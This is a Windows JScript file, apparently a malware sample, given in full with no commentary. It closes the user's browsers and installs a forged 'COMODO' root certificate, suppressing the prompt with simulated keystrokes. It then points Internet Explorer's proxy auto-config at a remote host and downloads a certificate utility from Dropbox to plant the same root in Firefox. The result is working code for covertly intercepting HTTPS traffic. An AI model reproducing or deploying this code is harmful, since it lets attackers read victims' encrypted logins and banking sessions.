var IE = null;
var FF = null;
var Cert = null;
var wss = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var BINARY_STREAM_TYPE = 1;
var TEXT_STREAM_TYPE = 2;
var CREATE_OVERWRITE_SAVE_MODE = 2;
var ENV_TEMP = wss.ExpandEnvironmentStrings("%TEMP%");
var ENV_APPDATA = wss.ExpandEnvironmentStrings("%APPDATA%");
var Config = {
  pac : "https://naturetrend.net/prototype.js", cert : "
MIIHWDCCBUCgAwIBAgIJAIHicTY/cdVEMA0GCSqGSIb3DQEBCwUAMIHNMQswCQYDVQQGEwJVUzEbMBkGA1UECBMSR3
JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDEnMCUG
A1UECxMeQ09NT0RPIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MScwJQYDVQQDEx5DT01PRE8gQ2VydGlmaWNhdGlvbi
BBdXRob3JpdHkxITAfBgkqhkiG9w0BCQEWEm1lQG15aG9zdC5teWRvbWFpbjAeFw0xNTEyMTQwODQ5MTFaFw0yNTEy
MTEwODQ5MTFaMIHNMQswCQYDVQQGEwJVUzEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYW
xmb3JkMRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDEnMCUGA1UECxMeQ09NT0RPIENlcnRpZmljYXRpb24gQXV0
aG9yaXR5MScwJQYDVQQDEx5DT01PRE8gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkxITAfBgkqhkiG9w0BCQEWEm1lQG
15aG9zdC5teWRvbWFpbjCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAN5e5Sl100l0QkNpIM7CrbNvlPrL
Gt0gbsde7Xhh/JSg8bxcZKSQIAqVvQInmrZ1LCpERQQVRb5oOAYa5caWIqrpaW4gljGl4q5l2JoIXkZQ21lxQ1b7VN
rr46SEMqwX/vuZrEPSPkXF1sMc4luv6GKIApjys4HTyQW4Zy9yatAWZLkaYzWcsqlbTgXBxVwBkT3UEiUhM9gIz00u
z6Vk5c2oLqz1LK+7WCLa4J/s3JfdPwJxrXriC/3Atm9p5hcOgsauceXqA44ZArP2ddnxO8KdRd019EVDGAinMAvYmt
7SW89prGo8a3VljDPK/r31Yye5JcMxoftohsypxBKoKvRm7aTowgLOSkuX+kd75n00zk1GkU9V7em05so+q6DlNCyH
7LglvHoB3wgbp9ikSSSeS9iCArb/ZTSk9Xkwl9BiPHgnUi9xcxG27kUc+cAHgXMqgjCMjn6/hSo2QyYfRO6fyLoYEy
IJqzRNii0gM7XvvUgwEGrKRrJ2oydXW+6deShSaQD3U/GidxDVs/fjjqBbrQ6PmAVjViRw5tGotLZYbcGEN3VgmLXw
Y+9LKgSPJvPXtQ9lUX6pp4OlV79iD+GZEl4BNv9QL9MPw8bSulREUu0qRUEAYiEyHgLKG+8C9cxwHy5zNzUxdaMjSM
fi0QL5zszeYSf7xfYIc8GSdSGhAgMBAAGjggE3MIIBMzAdBgNVHQ4EFgQUC5xX5C2rT2npj4SXO8mIRGIlcVEwggEC
BgNVHSMEgfowgfeAFAucV+Qtq09p6Y+ElzvJiERiJXFRoYHTpIHQMIHNMQswCQYDVQQGEwJVUzEbMBkGA1UECBMSR3
JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDEnMCUG
A1UECxMeQ09NT0RPIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MScwJQYDVQQDEx5DT01PRE8gQ2VydGlmaWNhdGlvbi
BBdXRob3JpdHkxITAfBgkqhkiG9w0BCQEWEm1lQG15aG9zdC5teWRvbWFpboIJAIHicTY/cdVEMAwGA1UdEwQFMAMB
Af8wDQYJKoZIhvcNAQELBQADggIBAGGzTQ2hquhRuA6FpRnyRPAFsxlKxxemoR4QHz4qFTsxcb/7cI9rhpHo1vfJXG
x2x0e/0+pMcDBdITq/z3UzzY2EpiBYECrRXauTjo2FW0D+JuqTlbbeYXQvl569nB1v9NxGEAsoDGrGt2+DlLvGDB0V
Fip4oWHJ7IzkUThzOOJcKIf3SUeasrzpYAYidpG4//VGYSuKT68gmzoXEfl0H5iTM7smq4I6yuYW5xGMFca2Q/ziFE
0GGeNG/+dOWuPopwZUgYlqpyvp379ZvxNj08zB6q5hmRv8rIKJInuii+XCzLW/nM7e5HbJ1InbE5Z17kaEUw8kL99a
5iZYNcLG0t0XDFVseAPuXnUpMFWi/316uaDHOKYcvnhlT/NjPhhrTVtjksRqro98ux6s/KAZuikol1JWBkgnEuOcux
KN1f8GoeiiXpw/B74NozusdQME9OtprH3U5kmsv5YYJ6hInnPNJY+FKzQU1xHhkptm1q3PrMRiA2kP4UQq2r1pTOyD
zX6rlT6Ct4otmvn26XSHY5AJoblBX0BfP40CjrOVLdCFPNFAg7jtncIYYyU1zX8kKWcw/e9yxt6LCNs2v2vT7zQSrZ
BvkVX2V9hu1nPFcPijWCXwE1MSJViCrwYYtEkzTbaDO7uu1eKaG+3S35nkWwTvIRBxH1zlt/re6ZrBIxwY", 
  cert_name : "COMODO Certification Authority"
}
;
var Helpers = {
  BinaryDataToFile : function (a, b){
    var c = new ActiveXObject("ADODB.Stream");
    c.Open();
    c.Type = BINARY_STREAM_TYPE;
    var d = new ActiveXObject("ADODB.Recordset");
    var e = b.length * 2;
    d.Fields.Append("data", 204, e, 0x80);
    d.Open();
    d.AddNew();
    d.Fields("data").AppendChunk(b);
    d.Update();
    d.MoveFirst();
    var f = d("data").GetChunk(e);
    d.Close();
    c.Write(f);
    c.Position = 0;
    if (fso.FileExists(a)){
      fso.DeleteFile(a)
    }
    c.SaveToFile(a);
    c.Close();
    var g = new ActiveXObject("ADODB.Stream");
    var h = new ActiveXObject("ADODB.Stream");
    g.Type = TEXT_STREAM_TYPE;
    h.Type = TEXT_STREAM_TYPE;
    h.Charset = "ISO-8859-1";
    g.Open();
    h.Open();
    g.LoadFromFile(a);
    g.Position = 0;
    g.CopyTo(h);
    g.Close();
    h.SaveToFile(a, CREATE_OVERWRITE_SAVE_MODE);
    h.Close()
  }
  , B64Dec : function (s){
    var a = Helpers.B64Dec.dtbl;
    if (undefined === a){
      var b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" + "0123456789+/=";
      var a = Helpers.B64Dec.dtbl = new Array(256);
      for (var i = 0; i < a.length; i ++ ){
        var c = String.fromCharCode(i);
        a[i] = b.indexOf(c);
        if (a[i] < 0)a[i] = 0
      }
    }
    var d = new Array();
    var e, c2, c3;
    var f, enc2, enc3, enc4;
    s = s.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    var g = s.length;
    while (61 === s.charCodeAt(g - 1))g--;
    var i = 0;
    var h = 4;
    while (h <= g){
      var j = h + 20480;
      if (j > g)j = g;
      for (;
      h <= j; h += 4){
        f = a[s.charCodeAt(i ++ )];
        enc2 = a[s.charCodeAt(i ++ )];
        enc3 = a[s.charCodeAt(i ++ )];
        enc4 = a[s.charCodeAt(i ++ )];
        d.push(String.fromCharCode((f << 2) | (enc2 >> 4), ((enc2 & 15) << 4) | (enc3 >> 2
        ), ((enc3 & 3) << 6) | enc4))
      }
      d = [d.join("")]
    }
    switch(g % 4){
      case0 : break ;
      case2 : f = a[s.charCodeAt(i ++ )];
      enc2 = a[s.charCodeAt(i ++ )];
      d.push(String.fromCharCode((f << 2) | (enc2 >> 4)));
      break ;
      case3 : f = a[s.charCodeAt(i ++ )];
      enc2 = a[s.charCodeAt(i ++ )];
      enc3 = a[s.charCodeAt(i ++ )];
      d.push(String.fromCharCode((f << 2) | (enc2 >> 4), ((enc2 & 15) << 4) | (enc3 >> 2
      )));
      break ;
      case1 : default : throw Error("B64Dec(): Unexpected remainder: " + (g % 4) + "(" + g
       + ", " + i + ")");
    }
    return d.join("")
  }
  , DownloadFile : function (a, b){
    var c = new ActiveXObject("ADODB.Stream");
    var d = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    d.open("GET", a, false);
    d.send();
    if (d.status == 200){
      c.Open();
      c.Type = 1;
      c.Write(d.responseBody);
      c.Position = 0;
      c.SaveToFile(b, CREATE_OVERWRITE_SAVE_MODE);
      c.Close()
    }
  }
  , UnZip : function (a, b){
    if (!fso.FolderExists(b)){
      fso.CreateFolder(b)
    }
    var c = new ActiveXObject("Shell.Application");
    var d = c.NameSpace(a).Items();
    c.NameSpace(b).CopyHere(d)
  }
  , DeleteFolder : function (a){
    var b = fso.GetFolder(a).Files;
    if (b.Count > 0){
      var e = new Enumerator(b);
      e.moveFirst();
      while (e.atEnd() == false){
        var c = e.item();
        fso.DeleteFile(c.Path);
        e.moveNext()
      }
    }
    fso.DeleteFolder(a)
  }
}
;
function C_Cert(){
  this .FileName = "cert.der";
  this .Init = function (){
    this .FileName = ENV_TEMP + "\\" + this .FileName;
    var a = Helpers.B64Dec(Config.cert);
    Helpers.BinaryDataToFile(this .FileName, a)
  }
  ;
  this .Close = function (){
    if (fso.FileExists(this .FileName)){
      fso.DeleteFile(this .FileName)
    }
  }
}
function C_IE(){
  this .InstallPac = function (){
    wss.RegWrite(
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL"
    , Config.pac, "REG_SZ")
  }
  ;
  this .InstallCert = function (){
    if (!this .IsCertUtilInstalled()){
    }
    wss.Run('certutil ?addstore ?f -user "ROOT" "' + Cert.FileName + '"', 0, false);
    WScript.Sleep(2000);
    var a = GetObject("winmgmts:").InstancesOf("Win32_Process");
    var b = "";
    for (var c = new Enumerator(a);
    !c.atEnd();
    c.moveNext()){
      var d = c.item();
      if (d.Name.indexOf("csrss.exe") !=- 1){
        wss.AppActivate(d.ProcessId)
      }
    }
    WScript.Sleep(1000);
    wss.SendKeys("{LEFT}{ENTER}")
  }
  ;
  this .IsCertUtilInstalled = function (){
    try {
      wss.Exec("certutil1 -?");
      return true
    }
    catch (e){
      return false
    }
  }
}
function C_FF(){
  var g = ENV_APPDATA + "\\Mozilla\\Firefox\\Profiles";
  var h = ENV_TEMP + "\\nssutils.zip";
  var j = ENV_TEMP + "\\firefox_add-certs\\bin";
  var k = j + "\\certutil.exe";
  this .GetProfile = function (){
    if (fso.FolderExists(g)){
      var a = fso.GetFolder(g).SubFolders;
      if (a.Count > 0){
        var e = new Enumerator(a);
        e.moveFirst();
        while (e.atEnd() == false){
          var b = e.item();
          if (b.Name.indexOf(".default") >- 1){
            return b.Path
          }
          e.moveNext()
        }
      }
    }
    return false
  }
  ;
  this .InstallPac = function (){
    var a = this .GetProfile();
    if (a != false){
      var b = a + "\\prefs.js";
      if (fso.FileExists(b)){
        var c = fso.OpenTextFile(b, 1).ReadAll();
        var d = c.split("\n");
        var e = [];
        for (var i = 0; i < d.length; i ++ ){
          if (d[i].indexOf("network.proxy.") ==- 1){
            e.push(d[i])
          }
        }
        c = e.join("\n");
        var f = fso.CreateTextFile(b, true);
        f.Write(c);
        f.Close()
      }
    }
  }
  ;
  this .InstallCert = function (){
    var a = this .GetProfile();
    if (a == false){
      return false
    }
    if (!fso.FileExists(k) ||! fso.FileExists(h)){
      Helpers.DownloadFile(
      "https://www.dropbox.com/s/1otx1fqibdcvjyx/firefox_add-certs.zip?dl=1", h)
    }
    if (fso.FileExists(h) &&! fso.FileExists(k)){
      Helpers.UnZip(h, ENV_TEMP)
    }
    if (fso.FileExists(k)){
      var b = k + ' -A -n "' + Config.cert_name + '" -t "TCu,Cuw,Tuw" -i "' + Cert.
      FileName + '" -d "' + a + '"';
      var c = wss.Exec(b)
    }
  }
  ;
  this .Close = function (){
    if (fso.FileExists(h)){
      fso.DeleteFile(h)
    }
  }
}
function Core(){
  this .Init = function (){
    Cert = new C_Cert();
    Cert.Init();
    IE = new C_IE();
    FF = new C_FF()
  }
  ;
  this .Start = function (){
    this .Init();
    this .CloseAllBrowsers();
    this .InstallIE();
    this .InstallFF();
    WScript.Sleep(5000);
    this .Close()
  }
  ;
  this .InstallIE = function (){
    IE.InstallCert();
    IE.InstallPac()
  }
  ;
  this .InstallFF = function (){
    FF.InstallCert();
    FF.InstallPac()
  }
  ;
  this .CloseAllBrowsers = function (){
    wss.Run("taskkill /F /im iexplore.exe", 0, false);
    wss.Run("taskkill /F /im firefox.exe", 0, false);
    wss.Run("taskkill /F /im chrome.exe", 0, false)
  }
  ;
  this .Close = function (){
    Cert.Close();
    FF.Close()
  }
}
var main = new Core();
main.Start();